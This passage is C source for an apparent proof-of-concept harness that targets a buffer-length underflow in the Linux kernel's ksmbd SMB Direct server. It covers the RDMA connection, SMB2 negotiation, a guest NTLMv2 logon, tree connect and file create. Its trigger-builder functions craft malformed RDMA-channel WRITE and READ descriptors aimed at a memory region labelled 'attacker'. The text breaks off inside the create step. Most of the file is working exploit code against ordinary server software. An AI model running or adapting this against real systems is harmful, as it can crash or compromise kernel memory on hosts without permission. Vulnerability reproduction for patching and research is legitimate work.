// SPDX-License-Identifier: GPL-2.0
// Author: al4n4n (Dadb0d) — adapted from HYEONTAE LEE's ZDI-CAN-33549 PoC
/*
 * s3rig - SMB Direct client for reproducing the ksmbd buf_len underflow.
 *
 * Does rdma_cm connect, SMB Direct negotiate, SMB2 NEGOTIATE / SESSION_SETUP
 * (raw NTLMSSP, guest) / TREE_CONNECT / CREATE, then sends one crafted
 * RDMA-channel WRITE or READ.
 *
 * Use port 445, not 5445: transport_rdma.c:391 limits 5445 to iWARP devices
 * and rxe reports RDMA_NODE_IB_CA, which only the 445 listener takes.
 *
 * Mode "control" does a plain single-descriptor RDMA write first, so a silent
 * kernel log can be told apart from an RDMA path that never ran.
 *
 * Exit codes: 0 all selected stages ran, 1 a stage failed (see the last
 * S3RIG: line), 2 bad usage. Exit 0 says nothing about whether the kernel
 * tripped; only dmesg does.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stddef.h>
#include <errno.h>
#include <unistd.h>
#include <time.h>
#include <ctype.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <rdma/rdma_cma.h>
#include <infiniband/verbs.h>
#include <openssl/evp.h>
#include <openssl/hmac.h>
#include <openssl/provider.h>

/* ------------------------------------------------------------------ tunables */

#define SMBD_PORT_DEFAULT "445"
#define SMBD_MAX_SEND 1364u
#define SMBD_MAX_RECV 8192u
#define SMBD_MAX_FRAG 1048576u
#define NRECV 8
#define ATTACKER_MR_SIZE (1u << 20)

#define TRIG_BUFLEN 8u
#define TRIG_DESC0_LEN 4096u
#define TRIG_DESC1_LEN 8192u

#define PACKED __attribute__((packed))

/* ------------------------------------------------------------- wire structs */

struct smbd_negotiate_req {
	uint16_t min_version, max_version, reserved, credits_requested;
	uint32_t preferred_send_size, max_receive_size, max_fragmented_size;
} PACKED;

struct smbd_negotiate_resp {
	uint16_t min_version, max_version, negotiated_version, reserved;
	uint16_t credits_requested, credits_granted;
	uint32_t status, max_readwrite_size, preferred_send_size;
	uint32_t max_receive_size, max_fragmented_size;
} PACKED;

struct smbd_data_transfer {
	uint16_t credits_requested, credits_granted, flags, reserved;
	uint32_t remaining_data_length, data_offset, data_length, padding;
} PACKED;
#define SMBD_DATA_OFFSET 0x18

struct smbd_bdesc_v1 {
	uint64_t offset;
	uint32_t token;
	uint32_t length;
} PACKED;

struct smb2_hdr_w {
	uint32_t ProtocolId;
	uint16_t StructureSize;
	uint16_t CreditCharge;
	uint32_t Status;
	uint16_t Command;
	uint16_t CreditRequest;
	uint32_t Flags;
	uint32_t NextCommand;
	uint64_t MessageId;
	uint32_t Reserved;
	uint32_t TreeId;
	uint64_t SessionId;
	uint8_t  Signature[16];
} PACKED;

struct smb2_write_req_w {
	struct smb2_hdr_w hdr;
	uint16_t StructureSize;
	uint16_t DataOffset;
	uint32_t Length;
	uint64_t Offset;
	uint64_t PersistentFileId;
	uint64_t VolatileFileId;
	uint32_t Channel;
	uint32_t RemainingBytes;
	uint16_t WriteChannelInfoOffset;
	uint16_t WriteChannelInfoLength;
	uint32_t Flags;
} PACKED;

struct smb2_read_req_w {
	struct smb2_hdr_w hdr;
	uint16_t StructureSize;
	uint8_t  Padding;
	uint8_t  Flags;
	uint32_t Length;
	uint64_t Offset;
	uint64_t PersistentFileId;
	uint64_t VolatileFileId;
	uint32_t MinimumCount;
	uint32_t Channel;
	uint32_t RemainingBytes;
	uint16_t ReadChannelInfoOffset;
	uint16_t ReadChannelInfoLength;
} PACKED;

#define SMB2_NEGOTIATE_CMD    0x0000
#define SMB2_SESSION_SETUP_CMD 0x0001
#define SMB2_TREE_CONNECT_CMD 0x0003
#define SMB2_CREATE_CMD       0x0005
#define SMB2_READ_CMD         0x0008
#define SMB2_WRITE_CMD        0x0009
#define SMB2_CHANNEL_RDMA_V1  0x00000001

#define SMB2_WRITE_BUFFER_OFF  0x70
#define SMB2_READ_BUFFER_OFF   0x70
#define SMB2_SESS_BUFFER_OFF   0x58
#define SMB2_TCON_BUFFER_OFF   0x48
#define SMB2_CREATE_BUFFER_OFF 0x78

#define STATUS_SUCCESS                  0x00000000u
#define STATUS_MORE_PROCESSING_REQUIRED 0xC0000016u

/* --------------------------------------------------------------- parameters */

struct trig_params {
	uint64_t persistent_fid, volatile_fid, session_id, message_id;
	uint32_t tree_id;
	uint64_t mr_addr;
	uint32_t mr_rkey;
	uint32_t buflen, desc0_len, desc1_len;
};

static void put_hdr(struct smb2_hdr_w *h, uint16_t cmd, const struct trig_params *p)
{
	memset(h, 0, sizeof(*h));
	h->ProtocolId    = 0x424d53fe;
	h->StructureSize = 64;
	h->CreditCharge  = 1;
	h->Command       = cmd;
	h->CreditRequest = 64;
	h->MessageId     = p->message_id;
	h->TreeId        = p->tree_id;
	h->SessionId     = p->session_id;
}

/* --------------------------------------------------------------- triggers */

static size_t build_write_trigger(uint8_t *out, size_t outsz,
				  const struct trig_params *p, int ndesc)
{
	struct smb2_write_req_w *w = (struct smb2_write_req_w *)out;
	struct smbd_bdesc_v1 *desc;
	size_t total = SMB2_WRITE_BUFFER_OFF + (size_t)ndesc * sizeof(*desc);

	if (outsz < total) return 0;
	memset(out, 0, total);

	put_hdr(&w->hdr, SMB2_WRITE_CMD, p);
	w->StructureSize          = 49;
	w->DataOffset             = 0;
	w->Length                 = 0;
	w->Offset                 = 0;
	w->PersistentFileId       = p->persistent_fid;
	w->VolatileFileId         = p->volatile_fid;
	w->Channel                = SMB2_CHANNEL_RDMA_V1;
	w->RemainingBytes         = p->buflen;
	w->WriteChannelInfoOffset = SMB2_WRITE_BUFFER_OFF;
	w->WriteChannelInfoLength = (uint16_t)(ndesc * sizeof(*desc));
	w->Flags                  = 0;

	desc = (struct smbd_bdesc_v1 *)(out + SMB2_WRITE_BUFFER_OFF);
	desc[0].offset = p->mr_addr;
	desc[0].token  = p->mr_rkey;
	desc[0].length = p->desc0_len;

	if (ndesc > 1) {
		desc[1].offset = p->mr_addr;
		desc[1].token  = p->mr_rkey;
		desc[1].length = p->desc1_len;
	}
	return total;
}

static size_t build_read_trigger(uint8_t *out, size_t outsz,
				 const struct trig_params *p, uint32_t length)
{
	struct smb2_read_req_w *r = (struct smb2_read_req_w *)out;
	struct smbd_bdesc_v1 *desc;
	size_t total = SMB2_READ_BUFFER_OFF + 2 * sizeof(*desc);

	if (outsz < total) return 0;
	memset(out, 0, total);

	put_hdr(&r->hdr, SMB2_READ_CMD, p);
	r->StructureSize          = 49;
	r->Length                 = length;
	r->Offset                 = 0;
	r->PersistentFileId       = p->persistent_fid;
	r->VolatileFileId         = p->volatile_fid;
	r->MinimumCount           = 0;
	r->Channel                = SMB2_CHANNEL_RDMA_V1;
	r->RemainingBytes         = 0;
	r->ReadChannelInfoOffset  = SMB2_READ_BUFFER_OFF;
	r->ReadChannelInfoLength  = 2 * sizeof(*desc);

	desc = (struct smbd_bdesc_v1 *)(out + SMB2_READ_BUFFER_OFF);
	desc[0].offset = p->mr_addr;
	desc[0].token  = p->mr_rkey;
	desc[0].length = p->desc0_len;
	desc[1].offset = p->mr_addr + p->desc0_len;
	desc[1].token  = p->mr_rkey;
	desc[1].length = p->desc1_len;
	return total;
}

/* ------------------------------------------------------------------- utility */

static void hexdump(const char *tag, const uint8_t *b, size_t n)
{
	size_t i;
	printf("%s (%zu bytes)\n", tag, n);
	for (i = 0; i < n; i++) {
		if (i % 16 == 0) printf("  %04zx:", i);
		printf(" %02x", b[i]);
		if (i % 16 == 15 || i + 1 == n) printf("\n");
	}
	fflush(stdout);
}

static size_t to_utf16(uint8_t *out, const char *s)
{
	size_t n = 0;
	while (*s) { out[n++] = (uint8_t)*s++; out[n++] = 0; }
	return n;
}

/* ----------------------------------------------------------------- transport */

struct rig {
	struct rdma_event_channel *ec;
	struct rdma_cm_id         *id;
	struct ibv_pd             *pd;
	struct ibv_cq             *cq;

	uint8_t      *sbuf;           struct ibv_mr *smr;
	uint8_t      *rbuf[NRECV];    struct ibv_mr *rmr[NRECV];
	uint8_t      *abuf;           struct ibv_mr *amr;

	uint16_t pending_grant;
	uint32_t peer_max_readwrite_size;
	char     devname[64];
};

static int wait_cm(struct rig *r, enum rdma_cm_event_type want)
{
	struct rdma_cm_event *ev;
	if (rdma_get_cm_event(r->ec, &ev)) { perror("rdma_get_cm_event"); return -1; }
	if (ev->event != want) {
		fprintf(stderr, "S3RIG: cm event %s (status %d), wanted %s\n",
			rdma_event_str(ev->event), ev->status, rdma_event_str(want));
		rdma_ack_cm_event(ev); return -1;
	}
	rdma_ack_cm_event(ev);
	return 0;
}

static int post_recv(struct rig *r, int i)
{
	struct ibv_sge sge = { .addr = (uintptr_t)r->rbuf[i],
			       .length = SMBD_MAX_RECV, .lkey = r->rmr[i]->lkey };
	struct ibv_recv_wr wr = { .wr_id = (uint64_t)i, .sg_list = &sge, .num_sge = 1 }, *bad;
	if (ibv_post_recv(r->id->qp, &wr, &bad)) return -1;
	r->pending_grant++;
	return 0;
}

static int post_send(struct rig *r, size_t len)
{
	struct ibv_sge sge = { .addr = (uintptr_t)r->sbuf,
			       .length = (uint32_t)len, .lkey = r->smr->lkey };
	struct ibv_send_wr wr = { .wr_id = 0x5000, .sg_list = &sge, .num_sge = 1,
				  .opcode = IBV_WR_SEND,
				  .send_flags = IBV_SEND_SIGNALED }, *bad;
	return ibv_post_send(r->id->qp, &wr, &bad);
}

static int poll_recv(struct rig *r, uint32_t *byte_len, int timeout_ms)
{
	struct ibv_wc wc;
	struct timespec t0, tn;
	clock_gettime(CLOCK_MONOTONIC, &t0);
	for (;;) {
		int n = ibv_poll_cq(r->cq, 1, &wc);
		if (n < 0) { fprintf(stderr, "S3RIG: ibv_poll_cq failed\n"); return -1; }
		if (n == 0) {
			if (timeout_ms > 0) {
				long ms;
				clock_gettime(CLOCK_MONOTONIC, &tn);
				ms = (tn.tv_sec - t0.tv_sec) * 1000 + (tn.tv_nsec - t0.tv_nsec) / 1000000;
				if (ms > timeout_ms) { fprintf(stderr, "S3RIG: poll timeout after %ld ms\n", ms); return -1; }
			}
			usleep(200);
			continue;
		}
		if (wc.status != IBV_WC_SUCCESS) {
			fprintf(stderr, "S3RIG: wc status %s (opcode %d, wr_id %llu)\n",
				ibv_wc_status_str(wc.status), wc.opcode, (unsigned long long)wc.wr_id);
			return -1;
		}
		if (wc.opcode == IBV_WC_RECV) { *byte_len = wc.byte_len; return (int)wc.wr_id; }
	}
}

static int drain_send(struct rig *r)
{
	struct ibv_wc wc;
	long spins = 0;
	for (;;) {
		int n = ibv_poll_cq(r->cq, 1, &wc);
		if (n < 0) return -1;
		if (n == 0) { if (++spins > 20000000) return -1; continue; }
		if (wc.status != IBV_WC_SUCCESS) {
			fprintf(stderr, "S3RIG: send wc status %s\n", ibv_wc_status_str(wc.status));
			return -1;
		}
		if (wc.opcode == IBV_WC_RECV) {
			/* RECV arrived before SEND completed — re-post and keep waiting */
			continue;
		}
		return 0;
	}
}

static int rig_connect(struct rig *r, const char *host, const char *port)
{
	struct rdma_addrinfo hints = { .ai_port_space = RDMA_PS_TCP }, *rai;
	struct ibv_qp_init_attr qa;
	struct rdma_conn_param cp;
	int i;

	r->ec = rdma_create_event_channel();
	if (!r->ec) { perror("rdma_create_event_channel"); return -1; }
	if (rdma_create_id(r->ec, &r->id, NULL, RDMA_PS_TCP)) { perror("rdma_create_id"); return -1; }
	if (rdma_getaddrinfo(host, port, &hints, &rai)) { perror("rdma_getaddrinfo"); return -1; }
	if (rdma_resolve_addr(r->id, NULL, rai->ai_dst_addr, 5000)) { perror("rdma_resolve_addr"); return -1; }
	if (wait_cm(r, RDMA_CM_EVENT_ADDR_RESOLVED)) return -1;
	if (rdma_resolve_route(r->id, 5000)) { perror("rdma_resolve_route"); return -1; }
	if (wait_cm(r, RDMA_CM_EVENT_ROUTE_RESOLVED)) return -1;

	snprintf(r->devname, sizeof(r->devname), "%s", ibv_get_device_name(r->id->verbs->device));

	r->pd = ibv_alloc_pd(r->id->verbs);
	r->cq = ibv_create_cq(r->id->verbs, 256, NULL, NULL, 0);
	if (!r->pd || !r->cq) { fprintf(stderr, "S3RIG: pd/cq failed\n"); return -1; }

	memset(&qa, 0, sizeof(qa));
	qa.send_cq = r->cq; qa.recv_cq = r->cq; qa.qp_type = IBV_QPT_RC;
	qa.cap.max_send_wr = 32; qa.cap.max_recv_wr = 32;
	qa.cap.max_send_sge = 4; qa.cap.max_recv_sge = 4;
	if (rdma_create_qp(r->id, r->pd, &qa)) { perror("rdma_create_qp"); return -1; }

	r->sbuf = calloc(1, SMBD_MAX_SEND);
	r->abuf = malloc(ATTACKER_MR_SIZE);
	if (!r->sbuf || !r->abuf) return -1;
	memset(r->abuf, 0x41, ATTACKER_MR_SIZE);

	r->smr = ibv_reg_mr(r->pd, r->sbuf, SMBD_MAX_SEND, IBV_ACCESS_LOCAL_WRITE);
	if (!r->smr) { perror("ibv_reg_mr send"); return -1; }
	r->amr = ibv_reg_mr(r->pd, r->abuf, ATTACKER_MR_SIZE,
			     IBV_ACCESS_LOCAL_WRITE | IBV_ACCESS_REMOTE_READ | IBV_ACCESS_REMOTE_WRITE);
	if (!r->amr) { perror("ibv_reg_mr attacker"); return -1; }

	for (i = 0; i < NRECV; i++) {
		r->rbuf[i] = calloc(1, SMBD_MAX_RECV);
		if (!r->rbuf[i]) return -1;
		r->rmr[i] = ibv_reg_mr(r->pd, r->rbuf[i], SMBD_MAX_RECV, IBV_ACCESS_LOCAL_WRITE);
		if (!r->rmr[i]) { perror("ibv_reg_mr recv"); return -1; }
		if (post_recv(r, i)) { perror("ibv_post_recv"); return -1; }
	}

	memset(&cp, 0, sizeof(cp));
	cp.initiator_depth = 8; cp.responder_resources = 8;
	cp.retry_count = 6; cp.rnr_retry_count = 6;
	if (rdma_connect(r->id, &cp)) { perror("rdma_connect"); return -1; }
	return wait_cm(r, RDMA_CM_EVENT_ESTABLISHED);
}

static int smbd_negotiate(struct rig *r)
{
	struct smbd_negotiate_req *q = (struct smbd_negotiate_req *)r->sbuf;
	struct smbd_negotiate_resp *p;
	uint32_t blen = 0;
	int idx;

	memset(q, 0, sizeof(*q));
	q->min_version = 0x0100; q->max_version = 0x0100;
	q->credits_requested = 255;
	q->preferred_send_size = SMBD_MAX_SEND;
	q->max_receive_size = SMBD_MAX_RECV;
	q->max_fragmented_size = SMBD_MAX_FRAG;

	if (post_send(r, sizeof(*q)) || drain_send(r)) return -1;
	idx = poll_recv(r, &blen, 20000);
	if (idx < 0) return -1;
	if (blen < sizeof(*p)) { fprintf(stderr, "S3RIG: short smbd negotiate response (%u)\n", blen); return -1; }
	p = (struct smbd_negotiate_resp *)r->rbuf[idx];
	r->peer_max_readwrite_size = p->max_readwrite_size;
	printf("S3RIG: smbd negotiated ver=0x%04x status=0x%08x credits_granted=%u "
	       "max_readwrite_size=%u max_receive_size=%u\n",
	       p->negotiated_version, p->status, p->credits_granted,
	       p->max_readwrite_size, p->max_receive_size);
	fflush(stdout);
	if (p->status != 0) return -1;
	return post_recv(r, idx);
}

static int smb2_xchg(struct rig *r, const uint8_t *pdu, size_t pdulen,
		     uint8_t *rsp, size_t rspcap, size_t *rsplen)
{
	struct smbd_data_transfer *dt = (struct smbd_data_transfer *)r->sbuf;
	size_t got = 0;

	if (SMBD_DATA_OFFSET + pdulen > SMBD_MAX_SEND) {
		fprintf(stderr, "S3RIG: pdu too large for one data transfer\n"); return -1;
	}
	memset(r->sbuf, 0, SMBD_DATA_OFFSET);
	dt->credits_requested = 255;
	dt->credits_granted = r->pending_grant;
	dt->data_offset = SMBD_DATA_OFFSET;
	dt->data_length = (uint32_t)pdulen;
	memcpy(r->sbuf + SMBD_DATA_OFFSET, pdu, pdulen);
	r->pending_grant = 0;

	if (post_send(r, SMBD_DATA_OFFSET + pdulen) || drain_send(r)) return -1;

	for (;;) {
		struct smbd_data_transfer *in;
		uint32_t blen = 0, dlen, doff, rem;
		int idx = poll_recv(r, &blen, 60000);
		if (idx < 0) return -1;
		in = (struct smbd_data_transfer *)r->rbuf[idx];
		dlen = in->data_length; doff = in->data_offset; rem = in->remaining_data_length;
		if (dlen) {
			uint32_t copy = dlen;
			if ((uint64_t)doff + dlen > blen) { fprintf(stderr, "S3RIG: malformed data transfer\n"); return -1; }
			if (got + copy > rspcap) copy = (uint32_t)(rspcap - got);
			memcpy(rsp + got, r->rbuf[idx] + doff, copy);
			got += copy;
		}
		if (post_recv(r, idx)) return -1;
		if (dlen && !rem) break;
	}
	*rsplen = got;
	return 0;
}

static uint32_t rsp_status(const uint8_t *rsp, size_t len)
{
	uint32_t s;
	if (len < 12) return 0xFFFFFFFFu;
	memcpy(&s, rsp + 8, 4);
	return s;
}

/* -------------------------------------------------------------- SMB2 staging */

static int smb2_negotiate(struct rig *r, struct trig_params *p)
{
	uint8_t pdu[256], rsp[2048];
	size_t rlen = 0;
	uint8_t *b = pdu;

	memset(pdu, 0, sizeof(pdu));
	put_hdr((struct smb2_hdr_w *)b, SMB2_NEGOTIATE_CMD, p);
	*(uint16_t *)(b + 64) = 36;
	*(uint16_t *)(b + 66) = 1;
	*(uint16_t *)(b + 68) = 1;
	*(uint16_t *)(b + 70) = 0;
	*(uint32_t *)(b + 72) = 0;
	memset(b + 76, 0xA5, 16);
	*(uint32_t *)(b + 92) = 0;
	*(uint16_t *)(b + 96) = 0;
	*(uint16_t *)(b + 98) = 0;
	*(uint16_t *)(b + 100) = 0x0302;

	if (smb2_xchg(r, pdu, 102, rsp, sizeof(rsp), &rlen)) return -1;
	printf("S3RIG: SMB2 NEGOTIATE rsp %zu bytes status=0x%08x dialect=0x%04x\n",
	       rlen, rsp_status(rsp, rlen), rlen >= 68 ? *(uint16_t *)(rsp + 68) : 0);
	fflush(stdout);
	return rsp_status(rsp, rlen) == STATUS_SUCCESS ? 0 : -1;
}

/* ----------------------------------------------------------- NTLMv2 crypto */

static void md4_hash(const uint8_t *in, size_t len, uint8_t *out)
{
	EVP_MD_CTX *ctx = EVP_MD_CTX_new();
	unsigned int olen = 16;
	const EVP_MD *md = EVP_md4();
	if (!md) {
		fprintf(stderr, "S3RIG: EVP_md4() unavailable (legacy provider not loaded)\n");
		memset(out, 0, 16);
		EVP_MD_CTX_free(ctx);
		return;
	}
	EVP_DigestInit_ex(ctx, md, NULL);
	EVP_DigestUpdate(ctx, in, len);
	EVP_DigestFinal_ex(ctx, out, &olen);
	EVP_MD_CTX_free(ctx);
}

static void hmac_md5(const uint8_t *key, size_t klen,
		     const uint8_t *data, size_t dlen, uint8_t *out)
{
	unsigned int olen = 16;
	HMAC(EVP_md5(), key, (int)klen, data, dlen, out, &olen);
}

static void ntlmv2_hash(const char *password, const char *user,
			 const char *domain, uint8_t *out)
{
	uint8_t utf16pw[256], nt_hash[16];
	uint8_t userdom[512];
	size_t pwlen, i, udlen = 0;

	pwlen = to_utf16(utf16pw, password);
	md4_hash(utf16pw, pwlen, nt_hash);

	for (i = 0; user[i]; i++) {
		userdom[udlen++] = (uint8_t)toupper((unsigned char)user[i]);
		userdom[udlen++] = 0;
	}
	for (i = 0; domain && domain[i]; i++) {
		userdom[udlen++] = (uint8_t)toupper((unsigned char)domain[i]);
		userdom[udlen++] = 0;
	}
	hmac_md5(nt_hash, 16, userdom, udlen, out);
}

static size_t build_ntlmssp_negotiate(uint8_t *o)
{
	memset(o, 0, 32);
	memcpy(o, "NTLMSSP\0", 8);
	*(uint32_t *)(o + 8) = 1;
	*(uint32_t *)(o + 12) = 0x60088215;
	return 32;
}

static size_t build_ntlmssp_auth_v2(uint8_t *o, size_t ocap,
				    const char *user, const char *password,
				    const uint8_t *challenge8,
				    const uint8_t *target_info, size_t ti_len)
{
	uint8_t ntv2_hash[16], ntproof[16];
	uint8_t client_challenge[8];
	uint8_t *blob_start, *p;
	size_t blob_len, nt_resp_len;
	uint8_t name_u16[128];
	size_t name_len;
	uint32_t off;
	struct timespec ts;
	uint64_t filetime;

	for (int i = 0; i < 8; i++) client_challenge[i] = (uint8_t)(rand() & 0xff);

	ntlmv2_hash(password, user, "", ntv2_hash);

	clock_gettime(CLOCK_REALTIME, &ts);
	filetime = ((uint64_t)ts.tv_sec + 11644473600ULL) * 10000000ULL +
		   (uint64_t)ts.tv_nsec / 100;

	/* NTLMv2 client blob: 0x0101 + reserved + timestamp + client_challenge + reserved + target_info + reserved */
	uint8_t temp[512];
	size_t temp_len = 0;
	temp[temp_len++] = 0x01; temp[temp_len++] = 0x01;
	temp[temp_len++] = 0; temp[temp_len++] = 0;
	temp[temp_len++] = 0; temp[temp_len++] = 0;
	temp[temp_len++] = 0; temp[temp_len++] = 0;
	memcpy(temp + temp_len, &filetime, 8); temp_len += 8;
	memcpy(temp + temp_len, client_challenge, 8); temp_len += 8;
	temp[temp_len++] = 0; temp[temp_len++] = 0;
	temp[temp_len++] = 0; temp[temp_len++] = 0;
	if (ti_len && target_info) {
		memcpy(temp + temp_len, target_info, ti_len); temp_len += ti_len;
	}
	temp[temp_len++] = 0; temp[temp_len++] = 0;
	temp[temp_len++] = 0; temp[temp_len++] = 0;

	/* NTProofStr = HMAC_MD5(ntv2_hash, challenge || temp) */
	uint8_t cat[1024];
	memcpy(cat, challenge8, 8);
	memcpy(cat + 8, temp, temp_len);
	hmac_md5(ntv2_hash, 16, cat, 8 + temp_len, ntproof);

	nt_resp_len = 16 + temp_len;

	name_len = to_utf16(name_u16, user);

	/* NTLMSSP_AUTH layout:
	 * 0-7: signature, 8-11: type(3)
	 * 12-17: LmChallengeResponse (len, maxlen, offset)
	 * 18-23: not used by us  -- we set LM to empty
	 * 20-25: NtChallengeResponse (len, maxlen, offset)
	 * 28-33: DomainName (len, maxlen, offset)
	 * 36-41: UserName (len, maxlen, offset)
	 * 44-49: Workstation (len, maxlen, offset)
	 * 52-57: EncryptedRandomSessionKey (len, maxlen, offset)
	 * 60-63: NegotiateFlags
	 * 64+: variable data
	 */
	memset(o, 0, 88);
	memcpy(o, "NTLMSSP\0", 8);
	*(uint32_t *)(o + 8) = 3;

	off = 88;

	/* LM response: empty */
	*(uint16_t *)(o + 12) = 0;
	*(uint16_t *)(o + 14) = 0;
	*(uint32_t *)(o + 16) = off;

	/* Domain: empty */
	*(uint16_t *)(o + 28) = 0;
	*(uint16_t *)(o + 30) = 0;
	*(uint32_t *)(o + 32) = off;

	/* UserName */
	*(uint16_t *)(o + 36) = (uint16_t)name_len;
	*(uint16_t *)(o + 38) = (uint16_t)name_len;
	*(uint32_t *)(o + 40) = off;
	memcpy(o + off, name_u16, name_len);
	off += (uint32_t)name_len;

	/* Workstation: empty */
	*(uint16_t *)(o + 44) = 0;
	*(uint16_t *)(o + 46) = 0;
	*(uint32_t *)(o + 48) = off;

	/* NtChallengeResponse: NTProofStr + temp */
	*(uint16_t *)(o + 20) = (uint16_t)nt_resp_len;
	*(uint16_t *)(o + 22) = (uint16_t)nt_resp_len;
	*(uint32_t *)(o + 24) = off;
	memcpy(o + off, ntproof, 16);
	memcpy(o + off + 16, temp, temp_len);
	off += (uint32_t)nt_resp_len;

	/* EncryptedRandomSessionKey: empty */
	*(uint16_t *)(o + 52) = 0;
	*(uint16_t *)(o + 54) = 0;
	*(uint32_t *)(o + 56) = off;

	*(uint32_t *)(o + 60) = 0x60088215;

	return (size_t)off;
}

static int smb2_session_setup(struct rig *r, struct trig_params *p,
			      const char *user, const char *password)
{
	uint8_t pdu[1024], rsp[2048], blob[1024];
	size_t rlen = 0, blen;
	uint32_t st;
	uint8_t server_challenge[8];
	const uint8_t *target_info = NULL;
	size_t ti_len = 0;

	/* Stage 0: NTLMSSP_NEGOTIATE */
	blen = build_ntlmssp_negotiate(blob);
	memset(pdu, 0, sizeof(pdu));
	p->message_id++;
	put_hdr((struct smb2_hdr_w *)pdu, SMB2_SESSION_SETUP_CMD, p);
	*(uint16_t *)(pdu + 64) = 25;
	pdu[66] = 0; pdu[67] = 1;
	*(uint32_t *)(pdu + 68) = 0;
	*(uint32_t *)(pdu + 72) = 0;
	*(uint16_t *)(pdu + 76) = SMB2_SESS_BUFFER_OFF;
	*(uint16_t *)(pdu + 78) = (uint16_t)blen;
	*(uint64_t *)(pdu + 80) = 0;
	memcpy(pdu + SMB2_SESS_BUFFER_OFF, blob, blen);

	if (smb2_xchg(r, pdu, SMB2_SESS_BUFFER_OFF + blen, rsp, sizeof(rsp), &rlen)) return -1;
	st = rsp_status(rsp, rlen);
	if (rlen >= 48) memcpy(&p->session_id, rsp + 40, 8);
	printf("S3RIG: SESSION_SETUP[0] status=0x%08x session=0x%llx\n",
	       st, (unsigned long long)p->session_id);
	fflush(stdout);
	if (st != STATUS_MORE_PROCESSING_REQUIRED) return -1;

	/* Extract the NTLMSSP_CHALLENGE from the response security buffer */
	{
		uint16_t sec_off = *(uint16_t *)(rsp + 68);
		uint16_t sec_len = *(uint16_t *)(rsp + 70);
		const uint8_t *sec = rsp + sec_off;
		const uint8_t *ntlm = sec;

		/* Find NTLMSSP signature - might be inside SPNEGO wrapper */
		if (sec_len > 8 && sec[0] == 0xa1) {
			/* SPNEGO negTokenResp - walk ASN.1 to find NTLMSSP */
			for (size_t i = 0; i + 8 <= sec_len; i++) {
				if (memcmp(sec + i, "NTLMSSP\0", 8) == 0) {
					ntlm = sec + i;
					break;
				}
			}
		}

		if (memcmp(ntlm, "NTLMSSP\0", 8) != 0 || *(uint32_t *)(ntlm + 8) != 2) {
			fprintf(stderr, "S3RIG: no NTLMSSP_CHALLENGE in response\n");
			return -1;
		}
		memcpy(server_challenge, ntlm + 24, 8);
		printf("S3RIG: server challenge: %02x%02x%02x%02x%02x%02x%02x%02x\n",
		       server_challenge[0], server_challenge[1], server_challenge[2], server_challenge[3],
		       server_challenge[4], server_challenge[5], server_challenge[6], server_challenge[7]);

		/* Extract TargetInfo (type 2 message: TargetInfoLen at +40, offset at +44) */
		uint16_t ti_len16 = *(uint16_t *)(ntlm + 40);
		uint32_t ti_off = *(uint32_t *)(ntlm + 44);
		if (ti_len16 > 0 && ti_off + ti_len16 <= sec_len + (size_t)(ntlm - sec)) {
			target_info = ntlm + ti_off;
			ti_len = ti_len16;
		}
	}

	/* Stage 1: NTLMSSP_AUTH with NTLMv2 */
	blen = build_ntlmssp_auth_v2(blob, sizeof(blob), user, password,
				     server_challenge, target_info, ti_len);
	memset(pdu, 0, sizeof(pdu));
	p->message_id++;
	put_hdr((struct smb2_hdr_w *)pdu, SMB2_SESSION_SETUP_CMD, p);
	*(uint16_t *)(pdu + 64) = 25;
	pdu[66] = 0; pdu[67] = 1;
	*(uint32_t *)(pdu + 68) = 0;
	*(uint32_t *)(pdu + 72) = 0;
	*(uint16_t *)(pdu + 76) = SMB2_SESS_BUFFER_OFF;
	*(uint16_t *)(pdu + 78) = (uint16_t)blen;
	*(uint64_t *)(pdu + 80) = p->session_id;
	memcpy(pdu + SMB2_SESS_BUFFER_OFF, blob, blen);

	if (smb2_xchg(r, pdu, SMB2_SESS_BUFFER_OFF + blen, rsp, sizeof(rsp), &rlen)) return -1;
	st = rsp_status(rsp, rlen);
	if (rlen >= 48) memcpy(&p->session_id, rsp + 40, 8);
	printf("S3RIG: SESSION_SETUP[1] status=0x%08x session=0x%llx flags=0x%04x\n",
	       st, (unsigned long long)p->session_id,
	       rlen >= 68 ? *(uint16_t *)(rsp + 66) : 0);
	fflush(stdout);
	return st == STATUS_SUCCESS ? 0 : -1;
}

static int smb2_tree_connect(struct rig *r, struct trig_params *p, const char *unc)
{
	uint8_t pdu[512], rsp[512];
	size_t rlen = 0, plen;
	uint32_t st;

	memset(pdu, 0, sizeof(pdu));
	p->message_id++; p->tree_id = 0;
	put_hdr((struct smb2_hdr_w *)pdu, SMB2_TREE_CONNECT_CMD, p);
	plen = to_utf16(pdu + SMB2_TCON_BUFFER_OFF, unc);
	*(uint16_t *)(pdu + 64) = 9;
	*(uint16_t *)(pdu + 66) = 0;
	*(uint16_t *)(pdu + 68) = SMB2_TCON_BUFFER_OFF;
	*(uint16_t *)(pdu + 70) = (uint16_t)plen;

	if (smb2_xchg(r, pdu, SMB2_TCON_BUFFER_OFF + plen, rsp, sizeof(rsp), &rlen)) return -1;
	st = rsp_status(rsp, rlen);
	if (rlen >= 40) memcpy(&p->tree_id, rsp + 36, 4);
	printf("S3RIG: TREE_CONNECT '%s' status=0x%08x tid=0x%08x\n", unc, st, p->tree_id);
	fflush(stdout);
	return st == STATUS_SUCCESS ? 0 : -1;
}

static int smb2_create(struct rig *r, struct trig_params *p, const char *name, uint64_t *eof)
{
	uint8_t pdu[512], rsp[1024];
	size_t rlen = 0, nlen;
	uint32_t st;

	memset(pdu, 0, sizeof(pdu));
	p->message_id++;
	put_hdr((struct smb2_hdr_w *)pdu, SMB2_CREATE_CMD, p);
	nlen = to_utf16(pdu + SMB2_CREATE_BUFFER_OFF, name);
	*(uint16_t *)(pdu + 64) = 57;
	pdu[66] = 0; pdu[67] = 0;
	*(uint32_t *)(pdu + 68) = 2;
	*(uint64_t *)(pdu + 72) = 0;
	*(uint64_t *)(pdu + 80) = 0;
	*(uint32_t *)(pdu + 88) = 0x0012019F;
	*(uint32_t *)(pdu + 92) = 0x00000080;
	*(uint32_t *)(pdu + 96) = 0x00000007;
	*(uint32_t *)(pdu + 100) = 3;
	*(uint32_t *)(pdu + 104) = 0x00000040;
	*(uint16_t *)(pdu + 108) = SMB2_CREATE_BUFFER_OFF;
	*(uint16_t *)(pdu + 110) = (uint16_t)nlen;
	*(uint32_t *)(pdu + 112) = 0;
	*(uint32_t *)(pdu + 116) = 0;

	if (smb2_xchg(r, pdu, SMB2_CREATE_BUFFER_OFF + nlen, rsp, sizeof(rsp), &rlen)) return -1;
	st = rsp_status(rsp, rlen);
